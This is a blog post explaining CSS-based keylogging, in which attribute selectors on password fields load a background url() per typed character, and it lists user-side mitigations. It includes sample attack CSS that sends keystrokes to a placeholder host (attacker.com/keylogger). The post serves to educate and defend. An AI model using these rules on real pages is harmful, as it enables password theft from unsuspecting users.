---
title: CSS Keylogging and how to Mitigate it
tags:
  - Security
  - Web
  - CSS
excerpt: >-
  Clever usage of CSS allows attackers to exfiltrate keystrokes to an
  attacker-controller server. This article examines how the attack works and how
  to migitate against it.
keywords:
  - Security
  - Web
  - Keylogging
  - Data Exfiltration
date: '2018-03-01 08:28:44'
---


I recently stumbled upon a fairly creative [proof of concept][1] for (ab)using
Cascading Style Sheets to record a user's keystrokes off a website. The sample
code contains a server and a sample Chrome extension that forwards the content of `password`
type input fields in a webpage. The sample itself is missing a few things to be
usable by a bad guy, but all the ideas and ingredients are there, ripe for the
picking.

This attack is especially dangerous because of the fact that it can run in any
browser extension that has access to the HTML of your pages. The problem is
amplified because most extensions that provide something useful will usually
require access to one or more websites. A very bad and yet popular example of
that are extensions that inject CSS for custom styling of webpages. These
extensions provide something very attractive to users, and it is very easy to
forget that whenever you install a *user*-style, you're running user-submitted
content in your browser.

Websites that let users customize their personal page with a CSS theme, like
Reddit (sub-reddit themes), can trick you into signing-in to reddit after a visit to
their page, thus sniffing your password as you type it.

I'll first explain the concepts behind the attack and then show a simplified
example of what the attack code might look like. Once that is out of the way,
I will talk about possible mitigations for the attack.

[1]: https://github.com/maxchehab/CSS-Keylogging


## How the Attack Works

The attack abuses a few CSS concepts which, by themselves, are completely
harmless, but combined in a creative fashion, pave the way towards keylogging:

*Attribute Selectors* make it possible to target a specific node in the DOM tree
based on an attribute and its value. This is useful for instance, when
attempting to apply a style rule to all input fields of a same type:
`input[type="radio"]`. There are multiple special comparator such as the `~=`
and `$=` [comparators][2]. The latter has the following interesting documentation:

> Represents an element with an attribute name of attr whose value is suffixed (followed) by value.


[2]: https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors

*Selector Chaining* is the concept of chaining multiple selectors to create a
more specific style rule. A good chaining example is the rule that says

``` css
#main input[type="radio"].valid {
    /* ... */
}
```

which targets an input of type `radio` which has the class `valid` and is inside
a node with an id of `main`.

*`url()` Value Keywords* which make it possible to reference static resources.
In any property that accepts an image as a value, as is the case with the
properties `background` and `background-image`, for example.

----

If the attack is not becoming clear yet, consider the following CSS snippet:

``` css
input[type="password"][value$="a"] {
  background: url("somewhere.png");
}
```

This rule says the following:

> For all inputs of type `password` that have a value ending in `a`, set the
> background to the image `somewhere.png`

All that one needs to do now is have one CSS rule per valid password character.
Fortunately, for most websites, this is limited to ASCII printable characters,
and as such all an attacker needs is 127 rules. The attack is possible because
CSS does not restrict which URLs `background-image` has access to. More
concretely,

``` css
input[type="password"][value$="a"] {
  background: url("https://www.attacker.com/keylogger/strokes/a");
}

input[type="password"][value$="b"] {
  background: url("https://www.attacker.com/keylogger/strokes/b");
}

/* ... all other ASCII characters ... */
```

This is the gist of the attack. It can be made more elaborate by capturing all
input fields and, for instance, to record the username as well.

On the server, the requests do not have a lot of information, but time and
delta-time between requests, along with the request originating IP address can
be used and analyzed to reconstruct each field separately. Heuristics (or manual
human intervention) can then be used to recover usernames and passwords.


## Mitigation


The best way to *prevent* this problem would be at the server level with a concept
similar to [content security policy][3] that disallows any `url()` property from
getting sites outside of the trusted sources (e.g. `your-site.com` and
`cdn.your-site.com`)

Unfortunately, CSP itself cannot prevent the attack entirely since it does not
provide a way to block `url()` requests or `<link>` tags that include
user-controlled theme files.

The best ways to *avoid* being keylogged are as follows:

1. Do not use extensions that have the right to modify all pages. This should be
   the very first step taken in order to protect yourself. If the extension can
   modify any page, there is nothing that prevents it from injecting malicious
   CSS into the page.

2. If extensions are a necessity, make sure to disable them whenever you are
   about to do something sensitive like inputting credentials. Refreshing the
   page with the extension disabled will ensure that there is no extension-code
   loaded.

3. Avoid inputting sensitive information on pages that allow their users to
   customize the stylesheet, as you don't know what the CSS is doing.

4. Use a password manager that automatically sets the value of input fields for
   you. If the password manager is setting the value directly, and the website
   is keylogged, this will only leak the last character of your password to the
   attacker. If your passwords are unique per web-site (as they should) and
   sufficiently strong, this last character should not have too significant of
   an impact.

---

As things stand right now, there is no foolproof protection against CSS
keylogging, and it does not look like it will be landing any time soon. The best
thing to do is to be wary of what is running in your browser and to remember
that when running user controlled code, extra care must be taken, in the same
way extra care must be taken when downloading executables from untrusted
sources.

[3]: https://en.wikipedia.org/wiki/Content_Security_Policy
